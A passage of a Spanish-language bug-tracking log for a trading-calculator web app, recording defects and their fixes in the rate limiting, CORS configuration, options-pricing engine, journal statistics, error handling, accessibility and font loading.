| A-03 | Campos revenue backend ≠ frontend | 🟠 | ✅ Resuelto (sesión 2026-06-13) |
| A-04 | Stripe SDK bloqueaba event loop | 🟠 | ✅ Resuelto (sesión 2026-06-13) |
| A-05 | SendGrid bloqueaba event loop | 🟠 | ✅ Resuelto (sesión 2026-06-13) |
| A-06 | Sin validación longitud contraseña | 🟠 | ✅ Resuelto (sesión 2026-06-13) |
| A-07 | DoS en /monte-carlo | 🟠 | ✅ Resuelto (sesión 2026-06-13) |
| A-09 | revoked_tokens sin purga | 🟡 | ✅ Resuelto (sesión 2026-06-13) |
| A-10 | Dockerfile ejecuta como root | 🟠 | ✅ Resuelto (sesión 2026-06-13) |
| C-08 | API keys en app_settings DB | 🟠 | ❌ Pendiente (decisión de producto) |
| LTV | Fórmula algebraicamente nula | 🟡 | ✅ Resuelto (sesión 2026-06-13) |
| M-13 | /health devuelve 200 con DB caída | 🟠 | ✅ Resuelto (sesión 2026-06-13) |
| M-14 | ADMIN_EMAILS hardcodeado | 🟡 | ✅ Resuelto (sesión 2026-06-13) |
| M-19 | /referrals/track sin rate limit | 🟡 | ✅ Resuelto (sesión 2026-06-13) |
| BUG-013 | Route shadowing en afiliados: `GET /admin/affiliates/{aid}` (declarada antes) capturaba las estáticas `/payout-runs` y `/payout-requests` → el panel admin recibía 404 "Afiliado no encontrado" (notificación de solicitudes de pago y listado de liquidaciones muertos). Detectado con E2E real (Postgres 16 + backend vivo). Fix: la ruta dinámica se registra al final del módulo + test de regresión de orden de rutas. | 🔴 | ✅ Resuelto (2026-07-19) |

---

| BUG-014 | AdminPage crasheaba ENTERO (React #31, pantalla "Algo salió mal") en cuanto `/admin/metrics` devolvía usuarios con plan: `PlanDistributionCard` trataba `by_plan` (LISTA `[{plan,count}]` del backend) como dict con `Object.entries` → renderizaba objetos como hijos de React. Nunca visto porque la UI admin no se había probado contra datos reales. Detectado al capturar el panel con backend vivo. Fix: normalización que acepta lista (y dict por compatibilidad). | 🔴 | ✅ Resuelto (2026-07-21) |

---

| BUG-015 | **Rate limiting con la IP equivocada detrás de Cloud Run.** `Limiter(key_func=get_remote_address)` devuelve `request.client.host`, que en Cloud Run es la IP del frontend de Google (uvicorn arranca sin `--forwarded-allow-ips` y su valor por defecto `127.0.0.1` no casa con el peer real, así que descarta `X-Forwarded-For`). Resultado: **todos los usuarios del mundo compartían un solo cubo** → `POST /auth/register` (3/hora) significaba 3 registros por hora en TODA la web, y `/auth/login` (10/min) bloqueaba a clientes legítimos. Pérdida directa de altas, invisible en los logs. Fix: `_real_client_ip()` lee XFF **contando desde la derecha** con `TRUSTED_PROXY_HOPS` (1 por defecto = Cloud Run directo), lo que además lo hace **no falsificable** (anteponer IPs falsas no funciona, al contrario que el clásico `parts[0]`). `_client_ip` del audit log admin —que sí usaba `parts[0]`, es decir era falsificable— pasa a delegar en el mismo helper. 9 tests de regresión (`test_rate_limit_key_unit.py`). | 🔴 | ✅ Resuelto (2026-07-26) |

---

*Actualización previa: 2026-07-26 — rate limiting por IP real detrás del proxy (BUG-015).*
---

| BUG-023 | **La pestaña Cadena era inusable al abrirla.** `OptionsChainView` montaba la tabla en un `flex-1 … overflow-hidden` cuyo hijo `overflow-auto` **no tenía altura acotada**: el contenedor que scrolleaba de verdad era la página, así que el `thead sticky top-0` se pegaba al contenedor equivocado y acababa **oculto detrás de las dos barras fijas** de la cabecera. Al entrar en la pestaña no se veía ni la fila CALLS/Strike/PUTS ni el selector de vencimiento — sólo un mar de números sin encabezado. Agravado porque el navegador conservaba la posición de scroll de la pestaña anterior y se aterrizaba a media tabla. Fix: la tabla scrollea DENTRO de su propia tarjeta (`max-h` acotada), la cabecera se pega a esa tarjeta, y `handleTabChange` vuelve al principio al cambiar de pestaña. | 🟠 | ✅ Resuelto (2026-07-30) |

---

| BUG-024 | **La UI afirmaba un tipo libre de riesgo distinto del que usaba el backend.** `market_rates.py` (PR #153) sacó el `0.0525` del pricing, pero `GreeksDisplay.jsx` seguía pintando `Risk-Free Rate 5.25%` como literal en su ficha de datos de mercado. Además `market_rates` calculaba la procedencia (`get_risk_free_info`) y **nada la publicaba**, así que el frontend no tenía de dónde leerla. Fix: nuevo `GET /api/market/risk-free` que expone el tipo y su origen (`^IRX` / `stale` / `fallback`), y `GreeksDisplay` lo consume con la procedencia en el tooltip. | 🟡 | ✅ Resuelto (2026-07-30) |

---

| BUG-026 | **El aviso de datos modelados sólo se pintaba en el optimizador.** `_synthetic_marker` marca las tres respuestas que pueden venir de una cadena modelada — `/options/chain`, `/options/iv-surface` y `/optimize` — pero en el frontend únicamente `OptimizeView` leía la bandera. En la calculadora y en la superficie de IV el usuario veía primas, griegas y skew fabricados **sin ningún aviso**, que es justo lo que §3.1 de la auditoría señalaba como indefendible en un producto de pago. Fix: componente `SyntheticDataBanner` (traducido a los 8 idiomas) montado en la calculadora y en la superficie; y el coach recibe la bandera, con instrucción de declararlo en su primera línea. | 🟠 | ✅ Resuelto (2026-07-30) |

---

| BUG-027 | **El coach de IA respondía siempre en español.** El PR #153 añadió `locale` al `AITradeAnalysisRequest` y la tabla `_AI_COACH_LANGUAGES`, pero **el frontend nunca enviaba el campo**, así que el valor por defecto (`"es"`) ganaba siempre en una web de 8 idiomas. Fix: `AITradeCoach` envía el locale activo de `useTranslation()`. | 🟡 | ✅ Resuelto (2026-07-30) |

---

| BUG-025 | **Concordancia y mezcla de idiomas en el editor de patas.** Mostraba `1 patas activas` (la concordancia singular/plural no se resuelve igual en los 8 idiomas, así que interpolar el número dentro de la frase estaba roto por diseño) y titulaba `Constructor de Legs`, mezclando castellano e inglés en una UI en castellano. En la barra de estrategia, `{riesgo} {etiqueta}` producía "Limitado riesgo · Ilimitado recompensa": orden adjetivo-sustantivo que sólo funciona en inglés. Fix: etiqueta de recuento (`patas activas: 1`), `optLegsBuilder` traducido en es/fr/de, y `etiqueta: valor` en el resumen de riesgo/recompensa. | 🟢 | ✅ Resuelto (2026-07-30) |

---

*Actualización previa: 2026-07-30 — rediseño del panel de opciones: cadena con scroll roto (BUG-023), tipo libre de riesgo desincronizado entre UI y backend (BUG-024), aviso de datos modelados que sólo salía en el optimizador (BUG-026), coach siempre en español (BUG-027) y concordancia/idioma en el editor de patas (BUG-025).*

---

| BUG-028 | **Un fallo del proveedor del tipo libre de riesgo se reintentaba en CADA llamada.** `market_rates.get_risk_free_rate` cacheaba los aciertos pero no los fallos: la comprobación `fresh` exige `rate is not None`, así que con el proveedor inalcanzable nunca había caché y todo llamante volvía a salir a la red. Medido: **25 llamadas → 25 intentos**, y lo mismo teniendo ya un valor previo caducado (que sí se servía, pero pagando el viaje igual, porque `fetched_at` no se actualizaba en la rama *stale*). La función está en la ruta de `/options/chain`, `/options/iv-surface`, `/optimize`, `/calculate/*` y `/performance/analytics`, así que ese peaje se cobraba en cada petición que el usuario estaba esperando; y el fetch heredaba el `timeout=15` × 2 hosts de `stock_data._yahoo_get`, hasta 30 s por petición si el fallo es por timeout en vez de por rechazo. Fix: ventana de reintento tras fallo (`FAILURE_BACKOFF_SECONDS = 15 min`, `force_refresh` la salta), y `timeout` parametrizable en `_yahoo_get` con 4 s para la tasa. Verificado: 25 llamadas → 1 intento. | 🟠 | ✅ Resuelto (2026-07-30) |

---

| BUG-029 | **La sugerencia de stop se pintaba sin muestra suficiente.** `generate_insights` exigía ≥10 ganadoras antes de hablar de estrechar el stop, pero `AnalyticsDashboard` lee `excursion.suggested_stop_r` directamente del payload y no comprobaba nada: con 2 operaciones ganadoras de MAE pequeña, el panel recomendaba una anchura de stop — y por tanto un tamaño de posición — a partir de dos observaciones. Fix: la guarda se mueve al origen (`MIN_WINNERS_FOR_STOP_ADVICE` en `_excursion_stats`), así que el campo sólo existe cuando está respaldado, y el insight deja de duplicar el umbral (no pueden divergir). | 🟠 | ✅ Resuelto (2026-07-30) |

---

| BUG-030 | **El factor de anualización de Sharpe/Sortino no tenía techo.** `_periods_per_year` exige mínimo de operaciones y de ventana, pero no acota el resultado: una muestra densa en poco tiempo —una semana de scalping, o un CSV importado de operaciones de tick— lleva las operaciones/año a cinco cifras y con ellas el factor √ppy. Medido: 400 operaciones en 10 días daban ≈14.610 ops/año y √≈121, convirtiendo un Sharpe por operación de 0,05 en un 6,0 presentado como dato. Fix: `MAX_TRADES_PER_YEAR = 2520` (~10 por sesión × 252 sesiones). | 🟡 | ✅ Resuelto (2026-07-30) |

---

| BUG-031 | **Las tarjetas de cabecera del simulador seguían siendo una tirada suelta.** El PR #153 añadió la distribución de Monte Carlo en un panel aparte, pero `SimulatorPro` seguía llamando a `runSimulation` para los KPI, así que el usuario leía un ROI, un drawdown y un profit factor de **una trayectoria aleatoria** justo encima de un rango P5–P95 que no la contenía; al recalcular, la cabecera cambiaba entera aunque la distribución apenas se moviese. Era la mitad no resuelta del bug original. Fix: PRNG con semilla (`makeRng`) y semilla por iteración en `runMonteCarlo`, que ahora devuelve `medianPath` reproducible; cuando el usuario lanza el barrido, la cabecera pasa a esa mediana y se etiqueta como tal. `opts.rnd` explícito sigue ganando, así que las comprobaciones deterministas de `engine-check.js` no cambian. | 🟠 | ✅ Resuelto (2026-07-30) |

---

*Última actualización: 2026-07-30 — reconciliación de las dos auditorías: reintentos sin caché del tipo libre de riesgo (BUG-028), sugerencia de stop sin muestra (BUG-029), anualización sin techo (BUG-030) y cabecera del simulador aún aleatoria (BUG-031).*

---

| BUG-032 | **Los calendars, las diagonales y el PMCC eran imposibles por arquitectura, no por falta de preset.** Tanto `presetLegs` como `customBuiltLegs` asignaban `daysToExpiry: currentExp.daysToExpiry` a **todas** las patas, y `LegEditor` trabajaba sobre una única `chain`: no existía forma de expresar una pata con vencimiento distinto. Ocho estructuras —calendar de call y de put, diagonal de call y de put, doble calendar, doble diagonal, jelly roll y PMCC, dos de ellas de las más usadas del retail— no estaban "sin implementar": el modelo de datos no las admitía. Y si se forzaba, el motor las valoraba como verticales, porque `calculateStrategyPayoff` aplicaba un único `daysToExpiry` global a cada pata. Fix: `expIdx` por pata en el editor, un mapa `{expIdx: chain}` en `CalculatorPage`, un endpoint de cadena multi-expiración (`?expiration_idxs=1,3,6`) para no disparar N peticiones, y tiempo restante POR PATA en el motor — el diagrama al vencimiento se dibuja al de la pata más cercana y la pata larga conserva su valor extrínseco. Fijado por `engine-check` con un control de mismo vencimiento que sí liquida al débito neto. | 🔴 | ✅ Resuelto (2026-07-31) |

---

| BUG-033 | **El frontend valoraba con un tipo libre de riesgo del 5% inventado mientras el backend usaba el real.** `CalculatorPage` pasaba `0.05` literal a `calculateStrategyPayoff`, `calculateStrategyGreeks` y `probabilityOfProfit`, y `blackScholes.js` lo repetía como valor por defecto de firma, teniendo `market_rates` en producción desde hacía dos PRs y el endpoint `/api/market/risk-free` ya publicado. Consecuencias: Rho era decorativo, las americanas se valoraban con un tipo falso y las tres estructuras cuyo P&L **es** el tipo de interés (box spread, jelly roll, conversion) habrían dado números sin sentido en cuanto se añadieran. Fix: hook `useRiskFreeRate` con caché a nivel de módulo (la tasa se mueve en puntos básicos, no una petición por panel), el tipo real se pasa a las cuatro llamadas del motor, y `GreeksStrip` publica el valor y su procedencia (`r = 4,28% · letra a 3 meses en vivo`) para que Rho tenga referencia. El literal superviviente es una única constante `FALLBACK_RISK_FREE_RATE`, nombrada para que un grep la encuentre. | 🔴 | ✅ Resuelto (2026-07-31) |

---

| BUG-034 | **El rango del gráfico de payoff estaba fijo en ±35% del spot.** El mismo ancho para un 0DTE de SPY —donde toda la acción ocurre en un ±1% y el payoff se veía como una línea plana en mitad del lienzo— que para un LEAPS de una small cap con IV del 80%, donde ±35% recorta justo la zona en la que la posición vive. Fix: `priceRangeFromExpectedMove` deriva el ancho de 2,5σ del expected move (`S·σ·√(T/365)`), con suelo del 10% y techo del 150%; sin volatilidad utilizable cae al 35% de siempre en vez de a un rango degenerado. | 🟡 | ✅ Resuelto (2026-07-31) |

---

| BUG-035 | **Cargar una posición guardada dejaba la calculadora a cero.** No estaba en la auditoría; apareció al tocar el mismo código. `handleLoadPosition` y `handleOpenInCalculator` construían las patas sin el campo `enabled`, y `customBuiltLegs` filtra por `l.enabled`: las patas llegaban al editor —donde se pintaban en gris al 40% de opacidad, el estilo de "pata desactivada"— pero salían del cálculo, así que el payoff quedaba vacío, las griegas a cero y los KPI en blanco. Afectaba a las dos rutas de entrada que no son teclear la posición a mano: recuperar una posición guardada y el botón "abrir en la calculadora" del optimizador. Fix: `enabled: true` explícito en ambos mapeos, más `expIdx` para que una posición guardada multi-expiración no se aplane en un vertical al recargarla. | 🟠 | ✅ Resuelto (2026-07-31) |

---

*Última actualización: 2026-07-31 — auditoría del apartado de opciones: multi-expiración imposible por arquitectura (BUG-032), tipo libre de riesgo inventado en el frontend (BUG-033), rango del gráfico fijo (BUG-034) y posiciones guardadas que se cargaban desactivadas (BUG-035).*

---

| BUG-036 | **El beneficio y la pérdida máximos salían del ancho del gráfico, no de la posición.** Reportado por el propietario: una call comprada mostraba un beneficio máximo concreto donde no lo hay. Los tres sitios que calculaban los extremos —`strategyStats.js`, `_payoff_summary` en `server.py` y `_score_strategy` en `options_optimize.py`— hacían `max()/min()` sobre los puntos de `calculate_payoff`, una rejilla de ±30–35% alrededor del spot, y decidían "ilimitado" comparando ese resultado con 5.000.000. Con spot 100 el máximo de la rejilla es ~3.300: el umbral no se cruzaba **nunca**, así que `isMaxProfitUnlimited` e `isMaxLossUnlimited` eran falsos siempre y la bandera de riesgo ilimitado que ya existía en la interfaz no llegaba a activarse. Tres consecuencias distintas: (1) una call comprada o un straddle comprado enseñaban un beneficio máximo finito —el P&L del borde derecho del gráfico— donde la respuesta es "sin acotar"; (2) una call vendida desnuda o un ratio 1x2 enseñaban una pérdida máxima finita, que es el error peligroso: invita a dimensionar contra una cifra que no es el peor caso; (3) lo acotado pero fuera de la ventana salía **mal**, no sólo recortado — una put comprada K=100 vale como mucho 9.800 € y la rejilla devolvía 3.300, un factor de tres. Además `SecondaryPanels` hacía `parseFloat(stats.maxProfit) \|\| 0`, que convertía "ilimitado" en 0 y hacía que Kelly concluyera «sin edge estadístico, evita el trade» justo en las estrategias de beneficio ilimitado. Fix: `payoffBounds`/`payoff_bounds` decide lo acotado por la **estructura** de las patas —la pendiente del payoff en el límite S→∞, donde una call se comporta como la acción y una put vale cero— y evalúa el extremo finito en S=0 y en cada strike, que son los únicos vértices de una función lineal a trozos. Sin acotar viaja como `null`, nunca como número; ROI y R/R sobre un extremo sin acotar pasan a indefinidos en vez de a `Infinity%`. 11 tests lo fijan. | 🔴 | ✅ Resuelto (2026-08-02) |

---

*Última actualización: 2026-08-02 — extremos del payoff medidos sobre el ancho del gráfico en vez de sobre la posición (BUG-036).*

---

| BUG-037 | **No se podía iniciar sesión: el origen donde se sirve la web no estaba en la lista de CORS del código.** La web se publica en `https://abcde-rgb.github.io/Tradingcalculatorpro.com` —no hay `CNAME` en `frontend/public/` y el `homepage` de `package.json` apunta ahí— pero `_CORS_ORIGINS` en `server.py` sólo traía `tradingcalculatorpro.com` y `www.`, que es el dominio que **todavía no está en uso**. Lo único que hacía funcionar el login era la variable `CORS_ORIGINS` que inyectaba el despliegue. El fallo es especialmente difícil de ver por tres razones: (1) **no aparece en los logs** — sin la cabecera `Access-Control-Allow-Origin` el backend responde **200, con las dos cookies puestas**, y es el navegador quien descarta la respuesta, así que en Cloud Run el login se ve perfecto; (2) **`curl` no lo reproduce**, porque curl ignora CORS — verificado: mismo `POST /api/auth/login` con `Origin: https://abcde-rgb.github.io` devuelve 200 y la respuesta no lleva `allow-origin`; (3) en el frontend el `catch` lo convierte en «No se puede conectar al servidor», que apunta a la red y no a la configuración. El detonante: desde el 2026-08-03 el backend **se despliega a mano** (`cloudbuild.yaml`, tras retirarse el workflow), y un `gcloud run deploy` sin `--set-env-vars` borra las variables del servicio — con ellas se va `CORS_ORIGINS` y el login del sitio entero cae. Mismo defecto en `FRONTEND_URL`, que caía a `https://tradingcalculatorpro.com` en cuatro sitios de `server.py` y en `_trusted_link_base` de `missing_apis.py`: si se pierde esa variable, los enlaces de verificación, reset y magic link llevan a un dominio que no se sirve, que deja al usuario igual de fuera. Fix: el origen real entra **por código**, no por despliegue; `FRONTEND_URL` se unifica en una sola constante `DEFAULT_FRONTEND_URL` cuyo valor coincide con el que ya ponía el despliegue, para que el código no pueda contradecirlo; y `_trusted_link_base` incluye el origen servido en su lista fija. El dominio propio se mantiene en la lista para que el cutover de DNS no rompa nada. 3 tests nuevos lo fijan, incluido que un origen no autorizado (`evil.com`) siga sin recibir cabecera. | 🔴 | ✅ Resuelto (2026-08-05) |

---

*Última actualización: 2026-08-05 — el origen donde se sirve la web no estaba permitido por el código, así que el login dependía de una variable de entorno del despliegue (BUG-037).*

---

| BUG-038 | **La respuesta vacía del escáner de estructura no tenía la forma que la documentación prometía.** `docs/ESCANER_ESTRUCTURA.md` §8 afirmaba —y el motor cumplía— que *"una respuesta vacía conserva exactamente las mismas claves que una completa: el cliente nunca tiene que ramificar por forma de respuesta"*. `detect_structure([])` devolvía en efecto la lectura completa con todo a cero, pero **la ruta no la usaba**: cuando el proveedor no devolvía velas, `education_structure_scan` construía a mano `{rowsScanned, trend, swings, events, levels, fvgs}` —seis claves de veinte— y el camino de error, cinco. Faltaban `counts`, `currentPrice`, `atr`, `tolerancePct`, `nearestResistance`, `nearestSupport`, `levelsAnalysed` y `lastBarForming`. No llegó a romper la interfaz porque el frontend leía todo con `\|\| {}` y `\|\| []` de forma defensiva, que es precisamente lo que enmascara este tipo de fallo: cualquier consumidor que se creyera el contrato documentado (o cualquier `data.counts.levels` escrito sin la guarda) habría reventado justo en el caso en que el proveedor se cae, que es el peor momento para descubrirlo. Fix: los dos caminos devuelven `detect_structure([], strength)`, y `test_structure_scan_routes_unit.py` compara el conjunto de claves de una respuesta vacía con el de una completa, incluidas las de `counts`. | 🟡 | ✅ Resuelto (2026-08-05) |

---

*Última actualización: 2026-08-05 (2) — la respuesta vacía del escáner de estructura no respetaba el contrato documentado (BUG-038).*

---

| BUG-039 | **Dos esquemas incompatibles en `db.trades`: el P&L de una operación del diario legado se reescribía a 0 al leerla desde analítica.** `POST /journal/trades` y `POST /performance/trades` **escriben en la misma colección** con esquemas distintos: el primero en camelCase (`entryPrice`, `exitPrice`, `quantity`, `leverage`) y el segundo en snake_case (`entry_price`, `exit_price`, `quantity`, `multiplier`). Ninguno de los dos filtra por esquema al leer, así que `perf_list_trades` consultaba `{"user_id": ...}` a secas y arrastraba también los documentos del diario legado. `compute_trade_pnl` busca `entry_price`, encuentra `entryPrice`, y con `entry == 0` toma la salida temprana del docstring: `pnl = 0.0`, `r_multiple = None`. Reproducido ejecutando el código del repo: un trade guardado con `pnl 10.0` se lee como `0.0`. Lo grave no es la lectura sino la escritura: `perf_update_trade` hace `{"$set": enriched}`, así que **en cuanto el usuario edita ese trade, el cero se persiste** y el P&L original se pierde para siempre. Contamina win rate, profit factor, expectancy y curva de equity de todo el panel. **No resuelto en Fase 0**: el arreglo es el modelo unificado multi-pata (Fase 1) más una migración que normalice el camelCase antes de convertir (Fase 2); parchear el filtro de lectura dejaría los documentos ya corrompidos sin recuperar. Ver `docs/AUDITORIA_DIARIO.md`. | 🔴 | ⏳ Pendiente (Fase 1+2) — verificado 2026-08-06 |

| BUG-040 | **`/journal/stats` calculaba drawdown y racha de pérdidas sin ordenar las operaciones.** `get_journal_stats` consultaba con `.to_list(1000)` **sin `.sort()`** y pasaba el resultado a `_aggregate_journal_trades`, que construye la curva de equity acumulando P&L en el orden en que llegaran las filas. El drawdown no es simétrico bajo inversión, así que las mismas operaciones daban un máximo distinto según el orden de inserción: verificado sobre las 24 permutaciones de un caso de 4 operaciones, salían dos drawdowns distintos (50 y 80). La función correcta —`sort_trades_chronologically`, que ordena por fecha de cierre— **ya existía en el repo, ya estaba importada en `server.py` y ya la usaba `/performance/analytics`**; sólo este endpoint no la llamaba. Es la tercera regla de honestidad numérica del proyecto («lo sensible al orden se ordena explícitamente») incumplida en el único sitio donde nadie la había mirado. Fix: ordenar antes de agregar, y docstring en `_aggregate_journal_trades` avisando de que la entrada tiene que venir ordenada. 3 tests fijan que el drawdown y la racha son iguales en las 24 permutaciones, y uno **comprueba que sin ordenar el bug es real**, para que el test no se quede probando nada si algún día deja de importar el orden. | 🔴 | ✅ Resuelto (2026-08-06) |

| BUG-041 | **El breakeven contaba como operación perdedora y el profit factor sin pérdidas valía 0.** Dos defectos de la misma familia en el mismo bloque. (1) `_aggregate_journal_trades` repartía con `if pnl > 0: wins else: losses`, así que una operación cerrada a 0 € entraba como perdedora: hundía el win rate e **incrementaba la racha de pérdidas** — tres scratches seguidos se leían como una racha de 3. (2) `profit_factor = gross_profit / gross_loss if gross_loss > 0 else 0` mostraba **0,00 —la peor cifra posible— a quien no ha perdido nunca**, que es justo el caso contrario. Es la segunda regla de honestidad numérica: lo que no se puede calcular es `None`, no `0`. Fix: el breakeven es categoría propia (`breakeven`), no extiende la racha ni la reinicia; `profitFactor` es `None` sin pérdidas y la UI pinta `∞` (misma convención que el simulador, que ya lo hacía). De paso, `expectancy` pasa a ser la media de P&L por operación en vez de `winRate·avgWin + lossRate·avgLoss`: esa identidad sólo se cumple si toda operación es ganadora o perdedora, y con scratches en la muestra el segundo término **cobraba cada breakeven al precio de una pérdida media**. Idéntica cuando no hay scratches, correcta cuando los hay. `JournalStats.jsx` hacía `stats.profitFactor.toFixed(2)`, que habría reventado con `null` — corregido a la vez. 8 tests. | 🟠 | ✅ Resuelto (2026-08-06) |

| BUG-042 | **El diario de `localStorage` compartía operaciones entre cuentas del mismo navegador.** `useTradingJournalStore` (`store.js`) persistía bajo la clave global `trading-journal-storage`, **sin `user_id`**: dos cuentas en el mismo equipo veían y editaban el mismo diario, y limpiar el navegador lo borraba todo. El usuario creía tener un diario y no lo tenía. Además calculaba el P&L sobre el nocional (`size × ((exit−entry)/entry) × leverage`), una **tercera** fórmula que para los mismos datos nunca coincide con la del backend (`(exit−entry) × qty × mult`), y `getStats()` era una **tercera** implementación de las estadísticas, con el breakeven como pérdida (`pnl <= 0`). Fix (Fase 0, congelar sin borrar): el store ya no acepta escrituras —`addTrade` y `updateTrade` retirados a propósito— y `getStats` se elimina; el componente pasa a archivo de solo lectura que avisa de que esas operaciones nunca se guardaron en la cuenta y ofrece **exportar a CSV y JSON** antes de borrarlas. Quien no tenga datos en `localStorage` no ve nada. No se borró de golpe precisamente porque había datos que rescatar. | 🟠 | ✅ Resuelto (2026-08-06) |

| BUG-043 | **`limit` sin techo en los dos listados de operaciones, y analítica truncada en silencio.** `GET /journal/trades` y `GET /performance/trades` aceptaban `limit` de la query string sin validar: un `?limit=1000000` convertía una petición en una lectura de tabla completa más una pasada de re-enriquecimiento (que además es cuadrática por el bucle `prev_trades`). Fix: `Query(100, ge=1, le=500)`, que FastAPI rechaza con 422 en validación. Aparte, `/performance/analytics` leía `limit=1000` y **no decía nada**: un trader activo con más historial veía métricas de un subconjunto —las 1.000 más recientes, porque `trades_for_user` ordena por `entry_date` descendente— creyendo que eran de todo su registro. Es la primera regla de honestidad numérica (nada sin etiquetar) aplicada a una ventana temporal. Fix: se piden `MAX+1` filas para distinguir «justo en el límite» de «hay más», y la respuesta publica `truncated`, `trades_analyzed` y `truncation_notice`. **Nota:** `Query` no estaba importado en `server.py` — de no haberlo detectado, el arranque habría fallado con `NameError`. | 🟠 | ✅ Resuelto (2026-08-06) |

| BUG-047 | **`GET /api/prices` servía oro y plata inventados cuando el proveedor se caía.** El endpoint tenía un respaldo fijo —`data.setdefault("gold", {"usd": 2680.0, "eur": 2450.0, "usd_24h_change": 0.5})` y su gemelo para la plata— escrito **dos veces**: una tras el bucle de yfinance y otra en el `except`. Con el proveedor caído la respuesta salía con **HTTP 200 y sin marca de ningún tipo**, así que el ticker del dashboard pintaba XAU a 2 680 $ con flecha verde y +0,5 %: un precio de fecha desconocida presentado como el de ahora. La variación diaria era peor todavía — una **observación fabricada**, la misma clase de dato que el volumen por `rng.randint` que ya se había retirado de las cadenas de opciones. Lo delator es que el criterio correcto ya estaba escrito veinte líneas más arriba **en el mismo endpoint**, para las monedas: «Una moneda que no se ha podido leer se omite. Rellenarla con un número plausible es indistinguible en pantalla de una real». Y el frontend ya hacía su parte (`if (!data || !data.usd) return null`, con comentario explicando que «$0» no es «no lo sé»): era el backend quien anulaba ese cuidado. Fix: se omiten, igual que una moneda ilegible; el fallo sólo se registra. Encontrado en el examen completo del 2026-08-07 al comprobar cómo degradan los endpoints que dependen de red externa. 4 tests fijan que ni los literales ni el `setdefault` ni una variación diaria escrita a mano vuelven, y una pasada de navegador confirma que el dashboard carga sin precios, sin excepción de React y sin cifra fantasma. | 🟠 | ✅ Resuelto (2026-08-07) |

| BUG-048 | **Cinco rutas convertían su propio 4xx en un 500, tres de ellas de facturación.** `HTTPException` hereda de `Exception`, así que un `try` que lanza `HTTPException(400)` y se cierra con `except Exception: raise HTTPException(500)` **reetiqueta su propia respuesta**. Afectaba a `cancel_subscription`, `resume_subscription`, `create_portal_session`, `save_user_state` y `ai_analyze_trade`. Consecuencias, en orden de gravedad: (1) en las tres de facturación, «no tienes suscripción activa» (404) y una `return_url` inválida (400) salían como **error del servidor**, así que el usuario cree que la web está rota y escribe a soporte en vez de corregir lo suyo; (2) el mensaje que el desarrollador se molestó en escribir —«state_id must be alphanumeric (1-64 chars)»— no llegaba a nadie, sustituido por «Error saving state»; (3) cada error de usuario entra en las alarmas como fallo del servidor, **enterrando los 500 de verdad** entre el ruido. El idioma correcto ya estaba en el repo (`except HTTPException: raise`, líneas 2052 y 3670): no había que inventar convención, sólo completarla. Encontrado el 2026-08-07 en el examen de autorización, al ver que `POST /user-states/save` sin `state_id` devolvía **500** teniendo escrito un 400. El test que lo fija recorre el **árbol sintáctico** en vez de llamar a las rutas, porque el fallo es estructural y así cubre también las que no tienen test de integración —que son casi todas, con `server.py` al 26 % de cobertura—; e incluye una prueba de que el propio detector encuentra el patrón, para que no se quede comprobando nada si algún día deja de funcionar. | 🟠 | ✅ Resuelto (2026-08-07) |

| BUG-049 | **El diario sellaba cada operación con el instante de TECLEARLA, en UTC.** El formulario no preguntaba la fecha —no había campo— y `make_trade_doc` ponía `datetime.now(timezone.utc)`. Dos consecuencias: (1) quien apunta por la noche las operaciones del día las tenía **todas con la misma marca de tiempo**, así que la agrupación por día, las rachas, la curva de capital, `trades_per_month` y las reglas que miran ventanas temporales (sobreoperar, operación de venganza) leían una historia que no ocurrió; (2) la analítica agrupa por los primeros 10 caracteres de la fecha ISO y por `weekday()`, o sea **por el día que exprese ese texto**: un trader en Tokio que opera el martes a las 8:00 (23:00 UTC del lunes) veía su operación contada en lunes, y «¿qué día opero mejor?» respondía sobre un calendario que no es el suyo. Fix: el formulario pregunta entrada y salida y las manda **con el desfase local** (`2026-08-04T23:30:00+02:00`), no convertidas a UTC. Así el backend no necesita saber nada de zonas — `[:10]` y `weekday()` caen solos en el día del trader— y `_to_utc` sigue normalizando para ordenar la curva, que sí tiene que ser absoluta. 8 tests fijan las dos mitades: que el día es el local (Madrid, Tokio y Nueva York) y que **el orden NO lo es** (dos operaciones de husos distintos se ordenan por instante real, no por el texto de la hora). Compatibilidad: lo guardado sin desfase se sigue leyendo como UTC. | 🟠 | ✅ Resuelto (2026-08-08) |

| BUG-050 | **51 incumplimientos graves de accesibilidad (WCAG 2.1 AA).** Nunca se había medido. Tres familias: (1) **27 botones sin nombre accesible** —tema, idioma, menú, campana de avisos, menú de usuario, cerrar de los modales y las acciones de cada fila del diario—: todos eran sólo un icono SVG, así que un lector de pantalla anunciaba «botón» y nada más; (2) **23 fallos de contraste** por apilar opacidad sobre texto ya atenuado: `text-muted-foreground` cumple de sobra (5,89:1) pero `text-muted-foreground/70` cae a 3,40:1 y con `opacity-80` a 4,12:1, por debajo del 4,5:1 que exige AA — y las insignias de estado (`#3b82f6` sobre su propio fondo al 15 %) quedaban al filo en 4,65:1 y fallaban al componerse con el fondo de la fila; (3) **`aria-controls` colgando** en las pestañas de `/performance`, porque había **dos raíces `<Tabs>`** —una con los disparadores y otra con los paneles— y Radix genera los ids por raíz: cada pestaña apuntaba a un panel inexistente. Fix: `aria-label` en todos los botones de icono (con el símbolo de la fila en la tabla, que «editar» repetido 40 veces no orienta a nadie), fuera la opacidad sobre texto secundario, variantes -400 en el texto de las insignias, y una sola raíz `<Tabs>`. **De 51 a 0 en escritorio y móvil.** La sonda queda en `tests/e2e/navegador/accesibilidad.js`. No es cosmético: la Ley Europea de Accesibilidad aplica desde junio de 2025 a los servicios de consumo en la UE. | 🟠 | ✅ Resuelto (2026-08-08) |

| BUG-051 | **Las fuentes de Google bloqueaban el primer pintado.** `index.html` cargaba cuatro familias (Inter, Unbounded, JetBrains Mono, Space Grotesk) con todos sus pesos mediante un `<link rel="stylesheet">` normal, o sea **en la ruta crítica**: el navegador no pinta nada hasta que Google responde. Medido con Playwright sobre el build de producción: **LCP 13.068 ms**. Buena parte de esa cifra es el sandbox —que bloquea `fonts.googleapis.com` y tarda en fallar— pero la dependencia bloqueante es real en cualquier red: en producción son cientos de milisegundos de pintado retrasado, y ante un fallo de Google, la página en blanco. Fix: `media="print"` + `onload="this.media='all'"`, que hace que el navegador la trate como no urgente, con `<noscript>` para conservar el comportamiento clásico sin JavaScript; el `display=swap` que la URL ya llevaba hace el resto. **LCP 13.068 ms → 524 ms**, CLS se mantiene en 0,011. Queda anotado aparte que servir las fuentes desde Google filtra la IP del visitante a un tercero, algo que tribunales alemanes han considerado incompatible con el RGPD sin consentimiento: alojarlas en el propio dominio lo cierra, y necesita red para descargarlas. | 🟠 | ✅ Resuelto (2026-08-08) |

